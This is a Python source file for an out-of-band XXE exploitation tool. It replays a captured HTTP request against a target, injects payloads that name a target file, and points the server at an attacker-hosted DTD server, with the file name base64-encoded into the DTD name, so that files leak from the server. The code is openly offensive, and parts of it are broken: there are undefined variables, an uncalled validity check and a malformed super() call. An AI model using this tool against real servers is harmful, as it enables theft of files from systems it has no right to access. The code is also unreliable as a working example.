import base64
from http.server import BaseHTTPRequestHandler
from io import BytesIO, StringIO
import requests




class HTTPFileParser(BaseHTTPRequestHandler):
    def __init__(self, request_text):
        self.request_text = request_text
        self.rfile = BytesIO(request_text)
        self.raw_requestline = self.rfile.readline()
        self.error_code = self.error_message = None
        self.parse_request()

    # def send_error(self, code, message):
    #     self.error_code = code
    #     self.error_message = message
    def send_error(self, code: int, message: str, explain: str) -> None:
        self.error_code = code
        self.error_message = message

    def extractPostData(self):
        if self.command != 'POST':
            return
        
        line = self.request_text.split('\n')[0]
        newline = '\r\n' if line.endswith('\r') else '\n'
        doubleReturn = newline + newline
        data = self.request_text.split(doubleReturn)[1:]
        return data[0]
        

class AttackSession(object):
    
    def __init__(self, dtdserver, proxies=None, **kwargs):
        # that is static for now / TODO use b64 in dtd filename to dynamically encode it
        self.dtd_url = f'http://{dtdserver[0]}:{dtdserver[1]}'
        self.proxies = proxies
        # the session we will use
        self._session = None

    @property
    def session(self):
        if self._session is None:
            self._session = requests.session()
            if self.proxies:
                self._session.proxies = self.proxies
        return self._session

    def isValidFile(self):
        if self.requestHandler.error_code:
            return False
        else:
            return True
    
    def getPostData(self):
        if self.isValidFile:
            return self.requestHandler.extractPostData()
        else:
            return None

    def requestFromFile(self, requestFile):
        raw_request = requestFile.read()
        requestHandler = HTTPFileParser(raw_request.encode())
        return requestHandler

    def makeRequestSession(self):
        host = self.requestHandler.headers.get('host', None)
        path = self.requestHandler.path
        self.url = self.uri + "://" + host + path
    
        session = requests.Session()

        for header in list(self.requestHandler.headers.keys()):
            if header != 'content-length':
                session.headers.update({header : self.requestHandler.headers.get(header)})
        
        if self.proxies:
            session.proxies = self.proxies
        return session

    def sendPayload(self, targetFilename):
        payload = self.build_payload(dtdurl, target_url, headers,)
        # postData.format(targetFilename=targetFilename, xxeHelperServerInterface=xxeHelperServerInterface, xxeHelperServerPort=xxeHelperServerPort))
        # payload = self.postData % (str(xxeHelperServerInterface).encode(), str(xxeHelperServerPort).encode())
        
        res = self.requestSession.post(self.url,payload)
        return res
        
    def spitFile(self, targetFileName):
        return targetFileName
    

class CliBuilder(AttackSession):
    ...


class TemplateBuilder(AttackSession):
    def __init__(self, requestFile, **kwargs):
        self.requestFile = requestFile
        self.uri = uri
        self.url = ''
        self.requestHandler = self.requestFromFile(requestFile)
        self.postData = self.getPostData()
        self.requestSession = self.makeRequestSession()
        super(TemplateBuilder).__init__(**kwargs)

    def isValidFile(self):
        if self.requestHandler.error_code:
            return False
        else:
            return True

    def getPostData(self):
        if self.isValidFile:
            return self.requestHandler.extractPostData()
        else:
            return None

    def requestFromFile(self, requestFile):
        raw_request = requestFile.read()
        requestHandler = HTTPFileParser(raw_request.encode())
        return requestHandler

    def makeRequestSession(self):
        host = self.requestHandler.headers.get('host', None)
        path = self.requestHandler.path
        self.url = self.uri + "://" + host + path

        session = requests.Session()

        for header in list(self.requestHandler.headers.keys()):
            if header != 'content-length':
                session.headers.update({header: self.requestHandler.headers.get(header)})

        if self.proxies:
            session.proxies = self.proxies
        return session

    def sendPayload(self, targetFilename):
        payload = self.build_payload(targetFilename)
        payload = self.postData.format(targetFilename=targetFilename, xxeHelperServerInterface=xxeHelperServerInterface,
                                       xxeHelperServerPort=xxeHelperServerPort)
        # payload = self.postData % (str(xxeHelperServerInterface).encode(), str(xxeHelperServerPort).encode())

        res = self.requestSession.post(self.url, payload)
        return res

    def spitFile(self, targetFileName):
        return targetFileName


class ModuleBuilder(AttackSession):
    def __init__(self, target, build_payload, **kwargs):
        self.target_url = target
        self.module_attack = build_payload
        super(ModuleBuilder, self).__init__(**kwargs)

    def sendPayload(self, targetFilename):
        # payload = self.build_payload(targetFilename)
        # res = self.requestSession.post(self.url, payload)
        b64_filename = base64.b64encode(targetFilename.encode()
                                        ).decode()
        dtd_filename = f'{b64_filename}.dtd'
        res = self.module_attack(self.session, self.target_url, self.dtd_url, dtd_filename)
        return res
